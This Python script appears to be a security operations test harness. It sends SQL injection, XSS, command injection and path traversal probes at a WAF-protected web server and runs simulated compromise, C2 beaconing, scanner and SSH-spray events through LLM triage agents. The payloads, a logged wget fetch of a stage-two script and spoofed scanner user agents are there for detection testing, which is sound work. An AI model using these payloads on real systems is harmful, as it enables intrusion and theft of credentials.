#!/usr/bin/env python3
"""
End-to-End Live Attack Simulation & SOC LLM Agent Triage Runner
===============================================================
Connects real HTTP attacks against the live OCI web-server (Nginx + ModSecurity WAF)
and Wazuh telemetry scenarios directly into the AI Engine multi-agent pipeline:

    Live Attacks -> Log Ingestion / Normalizer -> Correlator
        -> Triage Agent (LLM) -> MITRE Agent (LLM) -> Decision Agent (LLM)
        -> Deterministic Validator & Scoring Gate -> Auth Policy -> OCI Executor (Shadow Mode)

Usage:
    python3 scripts/simulate_attacks_and_triage.py
    python3 scripts/simulate_attacks_and_triage.py --target http://130.210.70.6 --skip-ssh
"""

import argparse
import datetime
import json
import os
import re
import subprocess
import sys
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any, Dict, List, Optional

REPO_ROOT = Path(__file__).resolve().parent.parent
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from ai_engine.baseline.store import BaselineStore
from ai_engine.ingest.wazuh_poller import dispatch_execution, parse_wazuh_alert
from ai_engine.main import run_incident
from ai_engine.schemas.models import IncidentState, NormalizedEvent


def _send_http_probe(base_url: str, params: Optional[Dict[str, str]] = None, headers: Optional[Dict[str, str]] = None) -> Dict[str, Any]:
    url = base_url.rstrip("/") + "/"
    if params:
        url = f"{url}?{urllib.parse.urlencode(params)}"
    req_headers = {"User-Agent": "SOC-E2E-Simulator/1.0"}
    if headers:
        req_headers.update(headers)
    req = urllib.request.Request(url, headers=req_headers, method="GET")
    status = 0
    try:
        with urllib.request.urlopen(req, timeout=8) as resp:
            status = resp.getcode()
    except urllib.error.HTTPError as exc:
        status = exc.code
    except Exception as exc:
        return {"url": url, "http_status": 0, "blocked": False, "error": str(exc)}
    return {"url": url, "http_status": status, "blocked": status == 403}


def _fetch_remote_modsec_blocks(host_ip: str, ssh_key: str) -> List[Dict[str, str]]:
    cmd = [
        "ssh",
        "-i",
        os.path.expanduser(ssh_key),
        "-o",
        "StrictHostKeyChecking=no",
        "-o",
        "ConnectTimeout=8",
        f"ubuntu@{host_ip}",
        "sudo tail -n 20 /var/log/nginx/error.log",
    ]
    proc = subprocess.run(cmd, capture_output=True, text=True)
    if proc.returncode != 0:
        return []
    blocks = []
    for line in proc.stdout.splitlines():
        if "ModSecurity: Access denied" not in line:
            continue
        req_m = re.search(r'request: "([^"]+)"', line)
        rule_m = re.search(r'\[id "(\d+)"\]', line)
        msg_m = re.search(r'\[msg "([^"]+)"\]', line)
        blocks.append(
            {
                "rule_id": rule_m.group(1) if rule_m else "949110",
                "msg": msg_m.group(1) if msg_m else "Access denied",
                "request": req_m.group(1) if req_m else "",
            }
        )
    return blocks


def _print_scenario_report(title: str, state: IncidentState, exec_res: Any, extra: Dict[str, Any]) -> Dict[str, Any]:
    print("\n" + "=" * 95)
    print(f"SCENARIO: {title}")
    print("=" * 95)
    print(f"Incident ID      : {state.incident_id}")
    print(f"Correlation Key  : ip={state.correlation_key[0]} | asset={state.correlation_key[1]}")
    print(f"Events Correlated: {len(state.events)} (sources: {sorted({e.source for e in state.events})})")
    if extra.get("live_http_probes"):
        blocked_cnt = sum(1 for p in extra["live_http_probes"] if p.get("blocked"))
        print(f"Live WAF Probes  : {blocked_cnt}/{len(extra['live_http_probes'])} blocked with HTTP 403 on {extra.get('target')}")
    if extra.get("ssh_captured_blocks"):
        print(f"Remote SSH Logs  : Captured {len(extra['ssh_captured_blocks'])} ModSecurity alert lines from nginx error.log")

    print("\n[1] Triage Agent (LLM):")
    if state.triage:
        for idx, step in enumerate(state.triage.timeline, 1):
            print(f"    {idx}. {step}")
        print(f"    Entities : {json.dumps(state.triage.entities)}")
        print(f"    Cited IDs: {state.triage.cited_event_ids}")

    print("\n[2] MITRE ATT&CK Agent (LLM):")
    if state.mitre:
        print(f"    Techniques: {state.mitre.techniques}")
        for tid, reason in state.mitre.justification.items():
            print(f"      - {tid}: {reason}")
        print(f"    Cited IDs : {state.mitre.cited_event_ids}")

    print("\n[3] Decision Agent (LLM Proposal):")
    if state.decision:
        print(f"    Proposed Action: {state.decision.proposed_action}")
        print(f"    Justification  : {state.decision.justification}")
        print(f"    Cited IDs      : {state.decision.cited_event_ids}")

    print("\n[4] Deterministic Gate & Policy Verdict:")
    print(f"    Validation Errors: {state.validation_errors}")
    print(f"    Risk Score       : {state.risk_score:.4f}" if state.risk_score is not None else "    Risk Score       : None")
    print(f"    Final Decision   : {state.final_decision}")

    print("\n[5] OCI Executor Dispatch:")
    if exec_res:
        print(f"    Action: {exec_res.action} | Status: {exec_res.status}")
        print(f"    Details: {json.dumps(exec_res.details)}")
    else:
        print("    Action: None (escalated / no automated action)")

    return {
        "title": title,
        "incident_id": state.incident_id,
        "correlation_key": list(state.correlation_key),
        "event_count": len(state.events),
        "triage": state.triage.model_dump() if state.triage else None,
        "mitre": state.mitre.model_dump() if state.mitre else None,
        "decision": state.decision.model_dump() if state.decision else None,
        "validation_errors": list(state.validation_errors),
        "risk_score": state.risk_score,
        "final_decision": state.final_decision,
        "execution_result": exec_res.model_dump() if exec_res else None,
        **extra,
    }


def run_scenario_1_live_web_exploit(target_url: str, ssh_key: str, skip_ssh: bool) -> Dict[str, Any]:
    probes = [
        _send_http_probe(target_url, params={"id": "1' UNION SELECT null,username,password FROM users--"}),
        _send_http_probe(target_url, params={"search": "<script>alert(document.cookie)</script>"}),
        _send_http_probe(target_url, params={"cmd": "; cat /etc/passwd"}),
        _send_http_probe(target_url, params={"file": "../../../../etc/shadow"}),
    ]

    host_ip = urllib.parse.urlparse(target_url).hostname or "130.210.70.6"
    ssh_blocks = [] if skip_ssh else _fetch_remote_modsec_blocks(host_ip, ssh_key)

    now = datetime.datetime.now(datetime.timezone.utc)
    attacker_ip = "198.51.100.44"
    asset = "prod-web-server"

    events: List[NormalizedEvent] = []
    waf_descriptions = [
        f"ModSecurity CRS rule {b['rule_id']}: {b['msg']} req={b['request']}"
        for b in ssh_blocks[-4:]
    ]
    if not waf_descriptions:
        waf_descriptions = [
            "ModSecurity blocked SQL injection payload: UNION SELECT username,password FROM users-- (rule 942100)",
            "ModSecurity blocked XSS payload: <script>alert(document.cookie)</script> (rule 941100)",
            "ModSecurity blocked OS command injection payload: ; cat /etc/passwd (rule 932100)",
            "ModSecurity blocked path traversal payload: ../../../../etc/shadow (rule 930100)",
        ]

    for idx, desc in enumerate(waf_descriptions):
        events.append(
            NormalizedEvent(
                event_id=f"evt-s1-waf-{idx+1}",
                source="waf",
                timestamp=now + datetime.timedelta(seconds=idx * 3),
                source_ip=attacker_ip,
                asset_tag=asset,
                severity=9,
                raw_indicator=desc,
            )
        )

    events.extend(
        [
            NormalizedEvent(
                event_id="evt-s1-wazuh-1",
                source="wazuh",
                timestamp=now + datetime.timedelta(seconds=15),
                source_ip=attacker_ip,
                asset_tag=asset,
                severity=8,
                raw_indicator="Wazuh rule 100201: Repeated ModSecurity Access denied HTTP 403 alerts for SQL injection and local file /etc/shadow read attempts",
            ),
            NormalizedEvent(
                event_id="evt-s1-flow-1",
                source="flowlog",
                timestamp=now + datetime.timedelta(seconds=20),
                source_ip=attacker_ip,
                asset_tag=asset,
                severity=7,
                raw_indicator="OCI VCN flowlog: sustained inbound HTTP attack burst to port 80 from external source",
            ),
        ]
    )

    state = run_incident(events)
    exec_res = dispatch_execution(state)
    return _print_scenario_report(
        "1. Live Multi-Vector Web Exploitation (SQLi + XSS + RCE + LFI on OCI web-server)",
        state,
        exec_res,
        {"target": target_url, "live_http_probes": probes, "ssh_captured_blocks": ssh_blocks[-4:]},
    )


def run_scenario_2_c2_and_lateral_movement() -> Dict[str, Any]:
    now = datetime.datetime.now(datetime.timezone.utc)
    attacker_ip = "203.0.113.55"
    asset = "prod-db-server"

    events = [
        NormalizedEvent(
            event_id="evt-s2-waf-1",
            source="waf",
            timestamp=now,
            source_ip=attacker_ip,
            asset_tag=asset,
            severity=9,
            raw_indicator="Web exploit detected: POST /upload.php SQL injection bypass",
        ),
        NormalizedEvent(
            event_id="evt-s2-wazuh-1",
            source="wazuh",
            timestamp=now + datetime.timedelta(seconds=6),
            source_ip=attacker_ip,
            asset_tag=asset,
            severity=9,
            raw_indicator="web shell file created: /var/www/html/uploads/cmd.php",
        ),
        NormalizedEvent(
            event_id="evt-s2-wazuh-2",
            source="wazuh",
            timestamp=now + datetime.timedelta(seconds=12),
            source_ip=attacker_ip,
            asset_tag=asset,
            severity=9,
            raw_indicator="process spawned by www-data: /bin/sh -c 'wget http://203.0.113.55/stage2.sh'",
        ),
        NormalizedEvent(
            event_id="evt-s2-flow-1",
            source="flowlog",
            timestamp=now + datetime.timedelta(seconds=20),
            source_ip=attacker_ip,
            asset_tag=asset,
            severity=8,
            raw_indicator="periodic outbound beacon every 30s to C2 203.0.113.55:443",
        ),
        NormalizedEvent(
            event_id="evt-s2-flow-2",
            source="flowlog",
            timestamp=now + datetime.timedelta(seconds=28),
            source_ip=attacker_ip,
            asset_tag=asset,
            severity=9,
            raw_indicator="internal connection attempt -> db tier 10.0.2.15:5432 (lateral movement blocked)",
        ),
    ]

    state = run_incident(events)
    exec_res = dispatch_execution(state)
    return _print_scenario_report(
        "2. Host Compromise, C2 Beaconing & Database Lateral Movement (prod-db-server)",
        state,
        exec_res,
        {},
    )


def run_scenario_3_automated_scanner(target_url: str) -> Dict[str, Any]:
    probes = [
        _send_http_probe(target_url, headers={"User-Agent": "sqlmap/1.7.2#stable (https://sqlmap.org)"}),
        _send_http_probe(target_url, headers={"User-Agent": "Mozilla/5.00 (Nikto/2.1.6)"}),
    ]

    now = datetime.datetime.now(datetime.timezone.utc)
    attacker_ip = "198.51.100.88"
    asset = "dev-web-server"

    events = [
        NormalizedEvent(
            event_id="evt-s3-waf-1",
            source="waf",
            timestamp=now,
            source_ip=attacker_ip,
            asset_tag=asset,
            severity=6,
            raw_indicator="HTTP 403 blocked automated security scanner fingerprint: sqlmap/1.7.2 (rule 913100)",
        ),
        NormalizedEvent(
            event_id="evt-s3-waf-2",
            source="waf",
            timestamp=now + datetime.timedelta(seconds=4),
            source_ip=attacker_ip,
            asset_tag=asset,
            severity=6,
            raw_indicator="HTTP 403 blocked automated web vulnerability scanner: Nikto/2.1.6 probing (rule 913100)",
        ),
        NormalizedEvent(
            event_id="evt-s3-flow-1",
            source="flowlog",
            timestamp=now + datetime.timedelta(seconds=9),
            source_ip=attacker_ip,
            asset_tag=asset,
            severity=5,
            raw_indicator="port scan: 64 distinct ports probed on target interface in 12s",
        ),
    ]

    state = run_incident(events)
    exec_res = dispatch_execution(state)
    return _print_scenario_report(
        "3. Automated Reconnaissance & Scanner Probing (SQLMap + Nikto on web-server)",
        state,
        exec_res,
        {"target": target_url, "live_http_probes": probes},
    )


def run_scenario_4_ssh_username_spray() -> Dict[str, Any]:
    now = datetime.datetime.now(datetime.timezone.utc)
    attacker_ip = "198.51.100.77"
    usernames = ["admin_test", "deploy_bot", "oracle_svc", "backup_ops"]

    events: List[NormalizedEvent] = []
    for idx, user in enumerate(usernames):
        raw_alert = {
            "timestamp": (now + datetime.timedelta(seconds=idx * 2)).isoformat(),
            "rule": {
                "level": 5,
                "description": "sshd: Attempt to login using a non-existent user (brute force)",
                "id": "5710",
                "groups": ["syslog", "sshd"],
            },
            "agent": {"id": "001", "name": "prod-web-server"},
            "manager": {"name": "wazuh-manager"},
            "data": {"srcip": attacker_ip, "dstuser": user},
        }
        ev = parse_wazuh_alert(raw_alert)
        events.append(ev)

    state = run_incident(events, baseline=BaselineStore(":memory:"))
    exec_res = dispatch_execution(state)
    return _print_scenario_report(
        "4. High-Diversity SSH Username Spray Attack (Wazuh Rule 5710 + Auth Policy R2)",
        state,
        exec_res,
        {},
    )


def main() -> int:
    parser = argparse.ArgumentParser(description="End-to-End Live Attack Simulation & AI Engine Triage")
    parser.add_argument(
        "--target",
        default=os.environ.get("WEB_TARGET_URL", "http://130.210.70.6"),
        help="Live OCI web-server URL (default: http://130.210.70.6)",
    )
    parser.add_argument(
        "--ssh-key",
        default="~/.ssh/soc-automation-ed25519",
        help="SSH key for fetching real remote ModSecurity logs",
    )
    parser.add_argument(
        "--skip-ssh",
        action="store_true",
        help="Skip SSH log retrieval from web-server",
    )
    parser.add_argument(
        "--json-out",
        default=str(REPO_ROOT / "evidence" / "llm_agent_attack_simulation_report.json"),
        help="Output JSON report path",
    )
    args = parser.parse_args()

    os.environ.setdefault("SHADOW_MODE", "true")

    reports = [
        run_scenario_1_live_web_exploit(args.target, args.ssh_key, args.skip_ssh),
        run_scenario_2_c2_and_lateral_movement(),
        run_scenario_3_automated_scanner(args.target),
        run_scenario_4_ssh_username_spray(),
    ]

    out_path = Path(args.json_out)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    summary = {
        "timestamp_utc": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "target_web_server": args.target,
        "llm_endpoint": os.environ.get("OLLAMA_BASE_URL", "http://localhost:11434"),
        "scenarios_total": len(reports),
        "all_stages_valid": all(not r["validation_errors"] for r in reports),
        "scenarios": reports,
    }
    out_path.write_text(json.dumps(summary, indent=2), encoding="utf-8")

    print("\n" + "=" * 95)
    print(f"SUMMARY: Executed {len(reports)} end-to-end attack simulations via live LLM agents.")
    for r in reports:
        action = r["execution_result"]["action"] if r["execution_result"] else "none"
        status = r["execution_result"]["status"] if r["execution_result"] else "escalated"
        print(
            f"  - {r['title']}\n"
            f"    Risk={r['risk_score']:.4f} | Verdict={r['final_decision']} | Exec={action} ({status}) | Errors={len(r['validation_errors'])}"
        )
    print(f"Evidence report written to: {out_path}")
    print("=" * 95 + "\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
